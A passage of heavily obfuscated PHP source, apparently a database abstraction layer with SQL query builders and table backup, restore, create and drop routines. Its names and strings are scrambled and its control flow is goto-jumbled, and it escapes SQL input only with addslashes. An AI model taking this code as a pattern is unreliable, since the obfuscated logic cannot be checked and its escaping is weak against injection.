$this->parseKey($A¾æ¸í˜») . $a“×œ™•Êˆ[947] . $this->parseValue($fø§Ş¥Ìä²); } $A¨Øö›¥‰æ = implode($DÑ××ÁŒ»µ, $Fª‡Á®èØƒ); break; } return $A¨Øö›¥‰æ; } protected function parseLimit($D†äà¥ŠË) { $Aâ‘®‚Ş¦ =& $_SERVER[ç]; return !empty($D†äà¥ŠË) ? $Aâ‘®‚Ş¦[48] . $D†äà¥ŠË . $Aâ‘®‚Ş¦[50] : $Aâ‘®‚Ş¦[33]; } protected function parseJoin($FáÙš‡•‚É) { $b‘¯ö–ù‚¸ =& $_SERVER[ç]; $Fù³‚ôÛÌ = $b‘¯ö–ù‚¸[33]; if (!empty($FáÙš‡•‚É)) { if (is_array($FáÙš‡•‚É)) { foreach ($FáÙš‡•‚É as $eÛ¥İÔ“ => $BáÊéŠ‰¼©) { if (!1 !== stripos($BáÊéŠ‰¼©, $b‘¯ö–ù‚¸[949])) { $Fù³‚ôÛÌ .= $b‘¯ö–ù‚¸[50] . $BáÊéŠ‰¼©; } else { $Fù³‚ôÛÌ .= $b‘¯ö–ù‚¸[950] . $BáÊéŠ‰¼©; } } } else { $Fù³‚ôÛÌ .= $b‘¯ö–ù‚¸[950] . $FáÙš‡•‚É; } } $Fù³‚ôÛÌ = preg_replace($b‘¯ö–ù‚¸[951], think_config($b‘¯ö–ù‚¸[857]) . $b‘¯ö–ù‚¸[952], $Fù³‚ôÛÌ); return $Fù³‚ôÛÌ; } protected function parseOrder($C©ôØœƒ’) { $c‚¨ƒ¢Â›ñ =& $_SERVER[ç]; if (is_array($C©ôØœƒ’)) { $bİ‚òÛ²ò = array(); foreach ($C©ôØœƒ’ as $d£ó›†ßç´ => $A©ß•Ÿ») { if (is_numeric($d£ó›†ßç´)) { $bİ‚òÛ²ò[] = $this->parseKey($A©ß•Ÿ»); } else { $A©ß•Ÿ» = in_array(strtoupper(trim($A©ß•Ÿ»)), array($c‚¨ƒ¢Â›ñ[953], $c‚¨ƒ¢Â›ñ[954])) ? $c‚¨ƒ¢Â›ñ[50] . $A©ß•Ÿ» : $c‚¨ƒ¢Â›ñ[33]; if (preg_match($c‚¨ƒ¢Â›ñ[955], $d£ó›†ßç´)) { $bİ‚òÛ²ò[] = $this->parseKey($d£ó›†ßç´) . $A©ß•Ÿ»; } else { think_exception($c‚¨ƒ¢Â›ñ[956] . $d£ó›†ßç´); } } } $C©ôØœƒ’ = implode($c‚¨ƒ¢Â›ñ[47], $bİ‚òÛ²ò); } return !empty($C©ôØœƒ’) ? $c‚¨ƒ¢Â›ñ[957] . $C©ôØœƒ’ : $c‚¨ƒ¢Â›ñ[33]; } protected function parseGroup($DêŸ®¨•­Ç) { $Eù§¾éêÛ¶ =& $_SERVER[ç]; return !empty($DêŸ®¨•­Ç) ? $Eù§¾éêÛ¶[958] . $DêŸ®¨•­Ç : $Eù§¾éêÛ¶[33]; } protected function parseHaving($cºè³ôÎ¯Ù) { $C¨¼Œ«ÈÜ =& $_SERVER[ç]; return !empty($cºè³ôÎ¯Ù) ? $C¨¼Œ«ÈÜ[959] . $cºè³ôÎ¯Ù : $C¨¼Œ«ÈÜ[33]; } protected function parseComment($d…Ş¿ãõğõ) { $aóïùáÃŸ‹ =& $_SERVER[ç]; return !empty($d…Ş¿ãõğõ) ? $aóïùáÃŸ‹[960] . $d…Ş¿ãõğõ . $aóïùáÃŸ‹[961] : $aóïùáÃŸ‹[33]; } protected function parseDistinct($E¸˜…ÈĞîÌ) { $EõÜˆ¼æùÀ =& $_SERVER[ç]; return !empty($E¸˜…ÈĞîÌ) ? $EõÜˆ¼æùÀ[962] : $EõÜˆ¼æùÀ[33]; } protected function parseUnion($dÏÆ–ª—«¨) { $Eò‘¯Ê’Û =& $_SERVER[ç]; if (empty($dÏÆ–ª—«¨)) { return $Eò‘¯Ê’Û[33]; } if (isset($dÏÆ–ª—«¨[$Eò‘¯Ê’Û[344]])) { $eÃ†’õ÷ó‚ = $Eò‘¯Ê’Û[963]; unset($dÏÆ–ª—«¨[$Eò‘¯Ê’Û[344]]); } else { $eÃ†’õ÷ó‚ = $Eò‘¯Ê’Û[964]; } foreach ($dÏÆ–ª—«¨ as $aÎ¶ÕğÎœ) { $A˜¨È«ŠÚÖ[] = $eÃ†’õ÷ó‚ . (is_array($aÎ¶ÕğÎœ) ? $this->buildSelectSql($aÎ¶ÕğÎœ) : $aÎ¶ÕğÎœ); } return implode($Eò‘¯Ê’Û[50], $A˜¨È«ŠÚÖ); } public function insert($dÅ®ÑÌ–Ö, $cÎ‹·ÌÑƒ‹ = array(), $fñˆ‚˜Íºç = false) { goto AÖ¹‰—«©ì; AÖ¹‰—«©ì: $bŒƒƒ…§é¶ =& $_SERVER[ç]; $dºùŞ­ÔÚŸ = $C°ãï™áÁš = array(); $this->model = $cÎ‹·ÌÑƒ‹[$bŒƒƒ…§é¶[277]]; goto b©ñÍˆŒˆº; b©ñÍˆŒˆº: foreach ($dÅ®ÑÌ–Ö as $a†¿‚öÔğ => $fÙ”èËÔ®è) { if (is_array($fÙ”èËÔ®è) && $bŒƒƒ…§é¶[293] == $fÙ”èËÔ®è[0]) { $C°ãï™áÁš[] = $this->parseKey($a†¿‚öÔğ); $dºùŞ­ÔÚŸ[] = $fÙ”èËÔ®è[1]; } elseif (is_scalar($fÙ”èËÔ®è) || is_null($fÙ”èËÔ®è)) { $C°ãï™áÁš[] = $this->parseKey($a†¿‚öÔğ); $dºùŞ­ÔÚŸ[] = $this->parseValue($fÙ”èËÔ®è); } } $FäÃÇåöá† = ($fñˆ‚˜Íºç ? $bŒƒƒ…§é¶[835] : $bŒƒƒ…§é¶[836]) . $bŒƒƒ…§é¶[837] . $this->parseTable($cÎ‹·ÌÑƒ‹[$bŒƒƒ…§é¶[275]]) . $bŒƒƒ…§é¶[831] . implode($bŒƒƒ…§é¶[47], $C°ãï™áÁš) . $bŒƒƒ…§é¶[832] . implode($bŒƒƒ…§é¶[47], $dºùŞ­ÔÚŸ) . $bŒƒƒ…§é¶[833]; $FäÃÇåöá† .= $this->parseLock(isset($cÎ‹·ÌÑƒ‹[$bŒƒƒ…§é¶[782]]) ? $cÎ‹·ÌÑƒ‹[$bŒƒƒ…§é¶[782]] : !1); goto e›îù°‹Ê…; e›îù°‹Ê…: $FäÃÇåöá† .= $this->parseComment(!empty($cÎ‹·ÌÑƒ‹[$bŒƒƒ…§é¶[350]]) ? $cÎ‹·ÌÑƒ‹[$bŒƒƒ…§é¶[350]] : $bŒƒƒ…§é¶[33]); return $this->execute($FäÃÇåöá†, $this->parseBind(!empty($cÎ‹·ÌÑƒ‹[$bŒƒƒ…§é¶[281]]) ? $cÎ‹·ÌÑƒ‹[$bŒƒƒ…§é¶[281]] : array())); goto fÚ¸…Í§…; fÚ¸…Í§…: } public function selectInsert($böš¹¸ÁˆÌ, $DÇòºÕ¨Ğ», $a®¶®ŠÌ† = array()) { goto C„Ù¥Ù ¬; BÒîªÀ•—: return $this->execute($eµÒµ›ËÏ, $this->parseBind(!empty($a®¶®ŠÌ†[$cø††×Ä‡Ñ[281]]) ? $a®¶®ŠÌ†[$cø††×Ä‡Ñ[281]] : array())); goto Eñ¼³¢Ö; C„Ù¥Ù ¬: $cø††×Ä‡Ñ =& $_SERVER[ç]; $this->model = $a®¶®ŠÌ†[$cø††×Ä‡Ñ[277]]; if (is_string($böš¹¸ÁˆÌ)) { $böš¹¸ÁˆÌ = explode($cø††×Ä‡Ñ[47], $böš¹¸ÁˆÌ); } goto f•å¾ê¸çÍ; f•å¾ê¸çÍ: array_walk($böš¹¸ÁˆÌ, array($this, $cø††×Ä‡Ñ[834])); $eµÒµ›ËÏ = $cø††×Ä‡Ñ[965] . $this->parseTable($DÇòºÕ¨Ğ») . $cø††×Ä‡Ñ[831] . implode($cø††×Ä‡Ñ[47], $böš¹¸ÁˆÌ) . $cø††×Ä‡Ñ[943]; $eµÒµ›ËÏ .= $this->buildSelectSql($a®¶®ŠÌ†); goto BÒîªÀ•—; Eñ¼³¢Ö: } public function update($C¢ÁíŸºè, $EöÜ†©°Ú”) { $bíÌæİˆÎ =& $_SERVER[ç]; $this->model = $EöÜ†©°Ú”[$bíÌæİˆÎ[277]]; $f·éŠÙÃ÷¥ = $bíÌæİˆÎ[966] . $this->parseTable($EöÜ†©°Ú”[$bíÌæİˆÎ[275]]) . $this->parseSet($C¢ÁíŸºè) . $this->parseWhere(!empty($EöÜ†©°Ú”[$bíÌæİˆÎ[271]]) ? $EöÜ†©°Ú”[$bíÌæİˆÎ[271]] : $bíÌæİˆÎ[33]) . $this->parseOrder(!empty($EöÜ†©°Ú”[$bíÌæİˆÎ[361]]) ? $EöÜ†©°Ú”[$bíÌæİˆÎ[361]] : $bíÌæİˆÎ[33]) . $this->parseLimit(!empty($EöÜ†©°Ú”[$bíÌæİˆÎ[288]]) ? $EöÜ†©°Ú”[$bíÌæİˆÎ[288]] : $bíÌæİˆÎ[33]) . $this->parseLock(isset($EöÜ†©°Ú”[$bíÌæİˆÎ[782]]) ? $EöÜ†©°Ú”[$bíÌæİˆÎ[782]] : !1) . $this->parseComment(!empty($EöÜ†©°Ú”[$bíÌæİˆÎ[350]]) ? $EöÜ†©°Ú”[$bíÌæİˆÎ[350]] : $bíÌæİˆÎ[33]); return $this->execute($f·éŠÙÃ÷¥, $this->parseBind(!empty($EöÜ†©°Ú”[$bíÌæİˆÎ[281]]) ? $EöÜ†©°Ú”[$bíÌæİˆÎ[281]] : array())); } public function delete($CØõ¬İˆÃ¼ = array()) { $AŸÚ¿£¥ƒó =& $_SERVER[ç]; $this->model = $CØõ¬İˆÃ¼[$AŸÚ¿£¥ƒó[277]]; $F²ÔñŸ“Ê = $AŸÚ¿£¥ƒó[967] . $this->parseTable($CØõ¬İˆÃ¼[$AŸÚ¿£¥ƒó[275]]) . $this->parseWhere(!empty($CØõ¬İˆÃ¼[$AŸÚ¿£¥ƒó[271]]) ? $CØõ¬İˆÃ¼[$AŸÚ¿£¥ƒó[271]] : $AŸÚ¿£¥ƒó[33]) . $this->parseOrder(!empty($CØõ¬İˆÃ¼[$AŸÚ¿£¥ƒó[361]]) ? $CØõ¬İˆÃ¼[$AŸÚ¿£¥ƒó[361]] : $AŸÚ¿£¥ƒó[33]) . $this->parseLimit(!empty($CØõ¬İˆÃ¼[$AŸÚ¿£¥ƒó[288]]) ? $CØõ¬İˆÃ¼[$AŸÚ¿£¥ƒó[288]] : $AŸÚ¿£¥ƒó[33]) . $this->parseLock(isset($CØõ¬İˆÃ¼[$AŸÚ¿£¥ƒó[782]]) ? $CØõ¬İˆÃ¼[$AŸÚ¿£¥ƒó[782]] : !1) . $this->parseComment(!empty($CØõ¬İˆÃ¼[$AŸÚ¿£¥ƒó[350]]) ? $CØõ¬İˆÃ¼[$AŸÚ¿£¥ƒó[350]] : $AŸÚ¿£¥ƒó[33]); return $this->execute($F²ÔñŸ“Ê, $this->parseBind(!empty($CØõ¬İˆÃ¼[$AŸÚ¿£¥ƒó[281]]) ? $CØõ¬İˆÃ¼[$AŸÚ¿£¥ƒó[281]] : array())); } public function select($e‹š¿¦æì¦ = array()) { goto eªçõâ‹èà; AÏ¤ãæª×Ó: if ($fØ“İ£·¾÷ && !1 !== $b•—£ŒÁ‚æ) { think_cache($cìÙ½ùâ«…, $b•—£ŒÁ‚æ, $fØ“İ£·¾÷); } return $b•—£ŒÁ‚æ; goto Cˆ›ŸÒŒè; bº¥ëÅ·: $fØ“İ£·¾÷ = isset($e‹š¿¦æì¦[$E±ãŠ†¨°Â[345]]) ? $e‹š¿¦æì¦[$E±ãŠ†¨°Â[345]] : !1; if ($fØ“İ£·¾÷) { $cìÙ½ùâ«… = is_string($fØ“İ£·¾÷[$E±ãŠ†¨°Â[92]]) ? $fØ“İ£·¾÷[$E±ãŠ†¨°Â[92]] : $E±ãŠ†¨°Â[968] . md5($EÏ©¼õï¼); $FÕ†˜Û¡ = think_cache($cìÙ½ùâ«…, $E±ãŠ†¨°Â[33], $fØ“İ£·¾÷); if (!1 !== $FÕ†˜Û¡) { return $FÕ†˜Û¡; } } $b•—£ŒÁ‚æ = $this->query($EÏ©¼õï¼, $this->parseBind(!empty($e‹š¿¦æì¦[$E±ãŠ†¨°Â[281]]) ? $e‹š¿¦æì¦[$E±ãŠ†¨°Â[281]] : array())); goto AÏ¤ãæª×Ó; eªçõâ‹èà: $E±ãŠ†¨°Â =& $_SERVER[ç]; $this->model = $e‹š¿¦æì¦[$E±ãŠ†¨°Â[277]]; $EÏ©¼õï¼ = $this->buildSelectSql($e‹š¿¦æì¦); goto bº¥ëÅ·; Cˆ›ŸÒŒè: } public function buildSelectSql($DáÆÂ¿âŠ = array()) { goto C›¥‡¤³ÃÔ; b¡²Ù©ËËš: return $EÏ¢©ˆÏ²Õ; goto b¤Î÷ÃÅ½Ò; AÓÉêº¾å®: $EÏ¢©ˆÏ²Õ = $this->parseSql($this->selectSql, $DáÆÂ¿âŠ); $EÏ¢©ˆÏ²Õ .= $this->parseLock(isset($DáÆÂ¿âŠ[$c©•™¶ğÕÑ[782]]) ? $DáÆÂ¿âŠ[$c©•™¶ğÕÑ[782]] : !1); if (isset($fĞ „¶•Å)) { think_cache($fĞ „¶•Å, $EÏ¢©ˆÏ²Õ); } goto b¡²Ù©ËËš; C›¥‡¤³ÃÔ: $c©•™¶ğÕÑ =& $_SERVER[ç]; if (isset($DáÆÂ¿âŠ[$c©•™¶ğÕÑ[349]])) { if (strpos($DáÆÂ¿âŠ[$c©•™¶ğÕÑ[349]], $c©•™¶ğÕÑ[47])) { list($Fœ¯ŸÛÚäÉ, $B’„ƒ©¡©) = explode($c©•™¶ğÕÑ[47], $DáÆÂ¿âŠ[$c©•™¶ğÕÑ[349]]); } else { $Fœ¯ŸÛÚäÉ = $DáÆÂ¿âŠ[$c©•™¶ğÕÑ[349]]; } $Fœ¯ŸÛÚäÉ = $Fœ¯ŸÛÚäÉ ? $Fœ¯ŸÛÚäÉ : 1; $B’„ƒ©¡© = isset($B’„ƒ©¡©) ? $B’„ƒ©¡© : (is_numeric($DáÆÂ¿âŠ[$c©•™¶ğÕÑ[288]]) ? $DáÆÂ¿âŠ[$c©•™¶ğÕÑ[288]] : 20); $eÇ»Ö–øáæ = $B’„ƒ©¡© * ((int) $Fœ¯ŸÛÚäÉ - 1); $DáÆÂ¿âŠ[$c©•™¶ğÕÑ[288]] = $eÇ»Ö–øáæ . $c©•™¶ğÕÑ[47] . $B’„ƒ©¡©; } if (think_config($c©•™¶ğÕÑ[969])) { $fĞ „¶•Å = $c©•™¶ğÕÑ[970] . md5(serialize($DáÆÂ¿âŠ)); $aª‰í•Ùë› = think_cache($fĞ „¶•Å); if ($aª‰í•Ùë›) { return $aª‰í•Ùë›; } } goto AÓÉêº¾å®; b¤Î÷ÃÅ½Ò: } public function parseSql($F‘ŠğÄé±ò, $Ağ‘¦Â‹× = array()) { $Cà³“Şš¢© =& $_SERVER[ç]; $F‘ŠğÄé±ò = str_replace(array($Cà³“Şš¢©[971], $Cà³“Şš¢©[972], $Cà³“Şš¢©[973], $Cà³“Şš¢©[974], $Cà³“Şš¢©[975], $Cà³“Şš¢©[976], $Cà³“Şš¢©[977], $Cà³“Şš¢©[978], $Cà³“Şš¢©[979], $Cà³“Şš¢©[980], $Cà³“Şš¢©[981]), array($this->parseTable("{$Ağ‘¦Â‹×[$Cà³“Şš¢©[275]]}"), $this->parseDistinct(isset($Ağ‘¦Â‹×[$Cà³“Şš¢©[982]]) ? $Ağ‘¦Â‹×[$Cà³“Şš¢©[982]] : !1), $this->parseField(!empty($Ağ‘¦Â‹×[$Cà³“Şš¢©[269]]) ? $Ağ‘¦Â‹×[$Cà³“Şš¢©[269]] : $Cà³“Şš¢©[182]), $this->parseJoin(!empty($Ağ‘¦Â‹×[$Cà³“Şš¢©[278]]) ? $Ağ‘¦Â‹×[$Cà³“Şš¢©[278]] : $Cà³“Şš¢©[33]), $this->parseWhere(!empty($Ağ‘¦Â‹×[$Cà³“Şš¢©[271]]) ? $Ağ‘¦Â‹×[$Cà³“Şš¢©[271]] : $Cà³“Şš¢©[33]), $this->parseGroup(!empty($Ağ‘¦Â‹×[$Cà³“Şš¢©[983]]) ? $Ağ‘¦Â‹×[$Cà³“Şš¢©[983]] : $Cà³“Şš¢©[33]), $this->parseHaving(!empty($Ağ‘¦Â‹×[$Cà³“Şš¢©[984]]) ? $Ağ‘¦Â‹×[$Cà³“Şš¢©[984]] : $Cà³“Şš¢©[33]), $this->parseOrder(!empty($Ağ‘¦Â‹×[$Cà³“Şš¢©[361]]) ? $Ağ‘¦Â‹×[$Cà³“Şš¢©[361]] : $Cà³“Şš¢©[33]), $this->parseLimit(!empty($Ağ‘¦Â‹×[$Cà³“Şš¢©[288]]) ? $Ağ‘¦Â‹×[$Cà³“Şš¢©[288]] : $Cà³“Şš¢©[33]), $this->parseUnion(!empty($Ağ‘¦Â‹×[$Cà³“Şš¢©[343]]) ? $Ağ‘¦Â‹×[$Cà³“Şš¢©[343]] : $Cà³“Şš¢©[33]), $this->parseComment(!empty($Ağ‘¦Â‹×[$Cà³“Şš¢©[350]]) ? $Ağ‘¦Â‹×[$Cà³“Şš¢©[350]] : $Cà³“Şš¢©[33])), $F‘ŠğÄé±ò); return $F‘ŠğÄé±ò; } public function getLastSql($Càøù·ğí‚ = '') { return $Càøù·ğí‚ ? $this->modelSql[$Càøù·ğí‚] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($bÉïÚŠ¬¨º) { return addslashes($bÉïÚŠ¬¨º); } public function setModel($a¾Òß—¿¯) { $this->model = $a¾Òß—¿¯; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($F­Ÿ¢íÆÖ†, $e¶‹¤Öá¶ö = '') { $this->database = $F­Ÿ¢íÆÖ†; $this->type = $e¶‹¤Öá¶ö; } public function model($B­Ğ¿Šä—Ç = '') { return new ModelBase($B­Ğ¿Šä—Ç, $_SERVER[ç][33], $this->database); } public function db($AøŠ·¥ÏÌ = false) { goto eÀùª¥¸‹; CÌ½×¥¼§: $this->database = $cóë’Î®…Û; $B’ïéëÀ†->execute("\x75\163\145\x20\x60{$Dâ×øî»É¥}\x60"); return $B’ïéëÀ†; goto cƒÂ ïùÓƒ; A»Òƒ‰«›„: if (!$A¹ «Ñ‹™Ó) { $B’ïéëÀ†->execute("\143\162\145\x61\x74\145\x20\x64\141\164\141\142\141\163\145\x20\140{$Dâ×øî»É¥}\140"); } $cóë’Î®…Û[$a¢Ø¤ÕÅ‰[897]] = $Dâ×øî»É¥; if ($cóë’Î®…Û[$a¢Ø¤ÕÅ‰[730]] == $a¢Ø¤ÕÅ‰[731]) { $cóë’Î®…Û[$a¢Ø¤ÕÅ‰[732]] .= $a¢Ø¤ÕÅ‰[985] . $Dâ×øî»É¥; } goto CÌ½×¥¼§; eÀùª¥¸‹: $a¢Ø¤ÕÅ‰ =& $_SERVER[ç]; $cóë’Î®…Û = array_change_key_case($this->database); if ($this->type == $a¢Ø¤ÕÅ‰[9] || !$AøŠ·¥ÏÌ) { return $this->model()->db(); } goto F£ŞÂËö‘Ö; F£ŞÂËö‘Ö: $Dâ×øî»É¥ = $cóë’Î®…Û[$a¢Ø¤ÕÅ‰[897]]; $cóë’Î®…Û[$a¢Ø¤ÕÅ‰[897]] = $a¢Ø¤ÕÅ‰[33]; if ($cóë’Î®…Û[$a¢Ø¤ÕÅ‰[730]] == $a¢Ø¤ÕÅ‰[731]) { $E…ñ—˜œèç = $cóë’Î®…Û[$a¢Ø¤ÕÅ‰[732]]; $cóë’Î®…Û[$a¢Ø¤ÕÅ‰[732]] = substr($E…ñ—˜œèç, 0, strrpos($E…ñ—˜œèç, $a¢Ø¤ÕÅ‰[985])); } goto BÜğ¬ˆ£áæ; BÜğ¬ˆ£áæ: $this->database = $cóë’Î®…Û; $B’ïéëÀ† = $this->model()->db(); try { $A¹ «Ñ‹™Ó = $B’ïéëÀ†->execute("\163\150\157\167\x20\x64\x61\x74\x61\142\x61\163\145\163\40\154\x69\153\x65\x20\47{$Dâ×øî»É¥}\47"); } catch (Exception $B×›œ„íŸ…) { } goto A»Òƒ‰«›„; cƒÂ ïùÓƒ: } public function createTable($a¨‰Ø­ƒ, $e±¤¥¹ä²Ù = null) { $DÆƒ«Ğ¾ÈÏ =& $_SERVER[ç]; if (!IO::exist($a¨‰Ø­ƒ)) { ActionCall($DÆƒ«Ğ¾ÈÏ[986], !0, 0); show_json(LNG($DÆƒ«Ğ¾ÈÏ[987]), !1); } $CÃƒöÎæŸ = sqlSplit(IO::getContent($a¨‰Ø­ƒ)); foreach ($CÃƒöÎæŸ as $Aîºì©¦…ƒ) { if ($e±¤¥¹ä²Ù) { $B¥ì˜„îÆç = stripos($Aîºì©¦…ƒ, $DÆƒ«Ğ¾ÈÏ[988]) === 0; if ($B¥ì˜„îÆç) { $e±¤¥¹ä²Ù->task[$DÆƒ«Ğ¾ÈÏ[989]] += 1; } } $this->model()->db()->execute($Aîºì©¦…ƒ); if ($e±¤¥¹ä²Ù && $B¥ì˜„îÆç) { preg_match($DÆƒ«Ğ¾ÈÏ[990], $Aîºì©¦…ƒ, $aÑ˜¿Å’â˜); $e±¤¥¹ä²Ù->task[$DÆƒ«Ğ¾ÈÏ[991]] = $aÑ˜¿Å’â˜[1]; $e±¤¥¹ä²Ù->update(1); } } $this->taskToCache($e±¤¥¹ä²Ù); } public function insertTable($F½™“œ±•, $bâË»Ç¶³… = null) { $eªğ°ãˆĞé =& $_SERVER[ç]; $a´ïœ”…« = $this->model()->db(); $b“áÍÚ¢‡ = $CÇğ¾¹Îò ? array($CÇğ¾¹Îò) : $a´ïœ”…«->getTables(); foreach ($F½™“œ±• as $BÀ˜ßÎÜ‹¿) { $CÇğ¾¹Îò = basename($BÀ˜ßÎÜ‹¿, $eªğ°ãˆĞé[723]); if (!in_array($CÇğ¾¹Îò, $b“áÍÚ¢‡)) { continue; } if ($bâË»Ç¶³…) { $bâË»Ç¶³…->task[$eªğ°ãˆĞé[991]] = $CÇğ¾¹Îò; } if (get_filesize($BÀ˜ßÎÜ‹¿) == 0) { continue; } $EÄ¨ñÅè² = $this->sqlToDb($BÀ˜ßÎÜ‹¿, $bâË»Ç¶³…); if (!$EÄ¨ñÅè²) { ActionCall($eªğ°ãˆĞé[986], !0, 0); show_json(LNG($eªğ°ãˆĞé[992]) . "\x5b{$CÇğ¾¹Îò}\135", !1); } } $this->taskToCache($bâË»Ç¶³…); } public function sqlFromDb($BŠ„«»ÀÁç, $CöÖ‘·öô, $b –ºç˜‹œ = null, $E·Â®œ·Šê = null) { goto BëŒ‰ïÑÂ‚; B²´Äôß•: $bŠĞÓã‘Û = $D³¼Êå‹˜->getPk(); $c™ Â³àµ = $D³¼Êå‹˜->getDbFields(); do { $d¸ÄˆÙéà = $D³¼Êå‹˜->field($c™ Â³àµ)->order($bŠĞÓã‘Û . $_SERVER[ç][994])->selectPage($EÒ¿ç‹–×…, $dÙÖ¼ÀÙ); $c°Ì——²†º = isset($d¸ÄˆÙéà[$_SERVER[ç][362]][$_SERVER[ç][364]]) ? $d¸ÄˆÙéà[$_SERVER[ç][362]][$_SERVER[ç][364]] : 0; $cÅ¸èË§Ú = !empty($d¸ÄˆÙéà[$_SERVER[ç][365]]) ? $d¸ÄˆÙéà[$_SERVER[ç][365]] : array(); if (!($bÕËŠøµ„ß = count($cÅ¸èË§Ú))) { break; } $fßƒÕëö–† = array(); foreach ($cÅ¸èË§Ú as $FÇñ‰™Œ) { if ($BŠ„«»ÀÁç == $_SERVER[ç][995] && $FÇñ‰™Œ[$_SERVER[ç][29]] == $_SERVER[ç][996]) { $aóÆå÷’É = json_decode($FÇñ‰™Œ[$_SERVER[ç][370]], !0); if ($aóÆå÷’É[$_SERVER[ç][28]] == date($_SERVER[ç][696]) && !$aóÆå÷’É[$_SERVER[ç][695]]) { continue; } } if ($E·Â®œ·Šê) { $FÇñ‰™Œ[$_SERVER[ç][75]] = "\173\x69\x6f\x3a{$E·Â®œ·Šê}\x7d" . substr($FÇñ‰™Œ[$_SERVER[ç][75]], strlen("\x7b\x69\x6f\72{$FÇñ‰™Œ[$_SERVER[ç][753]]}\175")); $FÇñ‰™Œ[$_SERVER[ç][753]] = $E·Â®œ·Šê; } $fßƒÕëö–†[] = $_SERVER[ç][997] . $this->sqlEncode($FÇñ‰™Œ) . $_SERVER[ç][998]; } $Bõšà¡§é = "\x49\116\x53\105\x52\x54\x20\111\116\x54\x4f\x20\140{$BŠ„«»ÀÁç}\140\x20\50\140" . implode($_SERVER[ç][999], $c™ Â³àµ) . $_SERVER[ç][1000]; fwrite($eª´†¡Ú á, $Bõšà¡§é . implode($_SERVER[ç][1001], $fßƒÕëö–†) . $_SERVER[ç][67] . PHP_EOL); $dÙÖ¼ÀÙ++; $cÔÎçİÚ¦ += $bÕËŠøµ„ß; if ($b –ºç˜‹œ) { $b –ºç˜‹œ->update($bÕËŠøµ„ß); } } while ($dÙÖ¼ÀÙ <= $c°Ì——²†º); goto CÕÅ‚è¤ğ‚; Dï´ø¸‹­: $dÙÖ¼ÀÙ = 1; $EÒ¿ç‹–×… = 500; $eª´†¡Ú á = fopen($CöÖ‘·öô, $_SERVER[ç][993]); goto B²´Äôß•; BëŒ‰ïÑÂ‚: if ($b –ºç˜‹œ) { $b –ºç˜‹œ->task[$_SERVER[ç][991]] = $BŠ„«»ÀÁç; } $D³¼Êå‹˜ = $this->model($BŠ„«»ÀÁç); $cÔÎçİÚ¦ = 0; goto Dï´ø¸‹­; CÕÅ‚è¤ğ‚: fclose($eª´†¡Ú á); return $cÔÎçİÚ¦; goto e¥‹È¢ï„Å; e¥‹È¢ï„Å: } public function sqlToDb($dïš£ÉÓö, $D¦²ÖÛÜÆ› = null) { goto cˆÃÁ‡ğªÜ; dõ°÷’à‘Ê: if (trim($D¿õÕñÛ¦)) { $D¿õÕñÛ¦ = rtrim(trim($D¿õÕñÛ¦), $B¥ÔØ‹Ëö[67]); if (!$e£ÍÀ¬ Êä->execute($D¿õÕñÛ¦)) { return !1; } if ($D¦²ÖÛÜÆ›) { $D¦²ÖÛÜÆ›->update($C¯å‡êÜ¬Š - 1); } } return !0; goto D…‘’˜åŒ; cˆÃÁ‡ğªÜ: $B¥ÔØ‹Ëö =& $_SERVER[ç]; $e£ÍÀ¬ Êä = $this->model()->db(); $AÇ¨Ï¦³Ùí = @fopen($dïš£ÉÓö, $B¥ÔØ‹Ëö[1002]); goto A‚í¢â’ˆ”; Dƒ×œÖåïë: $bÖ¬íî¾œ = 500 + 1; while (!feof($AÇ¨Ï¦³Ùí)) { if ($D¦²ÖÛÜÆ› && $C¯å‡êÜ¬Š != 0) { $D¦²ÖÛÜÆ›->task[$B¥ÔØ‹Ëö[989]] += 1; } $C¯å‡êÜ¬Š++; $A÷á‡— = trim(fgets($AÇ¨Ï¦³Ùí)); $D¿õÕñÛ¦ .= $B¥ÔØ‹Ëö[50] . $this->sqlDecode($A÷á‡—, $this->type); if ($C¯å‡êÜ¬Š == $bÖ¬íî¾œ) { $D¿õÕñÛ¦ = rtrim(trim($D¿õÕñÛ¦), $B¥ÔØ‹Ëö[67]); if (!$e£ÍÀ¬ Êä->execute($D¿õÕñÛ¦)) { return !1; } if ($D¦²ÖÛÜÆ›) { $D¦²ÖÛÜÆ›->update($C¯å‡êÜ¬Š - 1); } $D¿õÕñÛ¦ = $B¥ÔØ‹Ëö[33]; $C¯å‡êÜ¬Š = 0; } } fclose($AÇ¨Ï¦³Ùí); goto dõ°÷’à‘Ê; A‚í¢â’ˆ”: if (!$AÇ¨Ï¦³Ùí) { return !1; } $C¯å‡êÜ¬Š = 0; $D¿õÕñÛ¦ = $B¥ÔØ‹Ëö[33]; goto Dƒ×œÖåïë; D…‘’˜åŒ: } public function dropTable($Fğ„àÎÁÌ = null) { $bßÏÎÎ®šÍ = $this->model()->db(); $c¢¢Œ˜‚Ç = $Fğ„àÎÁÌ ? array($Fğ„àÎÁÌ) : $bßÏÎÎ®šÍ->getTables(); if (!$c¢¢Œ˜‚Ç) { return; } foreach ($c¢¢Œ˜‚Ç as $Fğ„àÎÁÌ) { $bßÏÎÎ®šÍ->execute("\x64\162\x6f\160\x20\164\141\142\x6c\x65\x20\151\146\x20\145\x78\x69\163\164\163\40\140{$Fğ„àÎÁÌ}\140"); } } private function taskToCache($b§Õ²ÀÉÜ = null) { $dØâ©ÆµÄ =& $_SERVER[ç]; if (!$b§Õ²ÀÉÜ) { return; } $C¥Ö©Ô„í = array($dØâ©ÆµÄ[991] => $b§Õ²ÀÉÜ->task[$dØâ©ÆµÄ[991]], $dØâ©ÆµÄ[989] => $b§Õ²ÀÉÜ->task[$dØâ©ÆµÄ[989]], $dØâ©ÆµÄ[1003] => $b§Õ²ÀÉÜ->task[$dØâ©ÆµÄ[1003]]); if ($C¥Ö©Ô„í[$dØâ©ÆµÄ[989]] == $C¥Ö©Ô„í[$dØâ©ÆµÄ[1003]]) { $C¥Ö©Ô„í[$dØâ©ÆµÄ[702]] = 1; } Cache::set($dØâ©ÆµÄ[1004] . $b§Õ²ÀÉÜ->task[$dØâ©ÆµÄ[388]], $C¥Ö©Ô„í); $b§Õ²ÀÉÜ->end(); } private function sqlEncode($DĞè¤¬‚÷á) { $cÇ•–ñ¹¹¬ =& $_SERVER[ç]; $cİĞ…ÛÇĞ = array(); foreach ($DĞè¤¬‚÷á as $bÜ›‰—ƒ ¬) { if (is_array($bÜ›‰—ƒ ¬)) { $bÜ›‰—ƒ ¬ = json_encode_force($bÜ›‰—ƒ ¬); } 